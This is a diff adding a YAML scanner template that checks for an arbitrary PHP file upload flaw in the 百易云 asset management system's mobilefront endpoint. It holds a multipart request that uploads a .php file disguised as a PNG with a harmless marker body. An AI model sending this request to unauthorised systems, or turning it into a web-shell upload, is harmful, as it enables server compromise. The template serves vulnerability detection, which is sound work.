@@ -1,0 +1,30 @@
+id:
+
+info:
+  name: 百易云资产管理运营系统mobilefront任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /mobilefront/c/2.php
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    X-Requested-With: XMLHttpRequest
+  data: |
+    -----------------------------289666258334735365651210512949
+    Content-Disposition: form-data; name="file1"; filename="2122.php"
+    Content-Type: image/png
+
+    123456
+    -----------------------------289666258334735365651210512949--
+response1:
+  headers:
+  body: .php
+  code: 200
+requests2:
+response2:
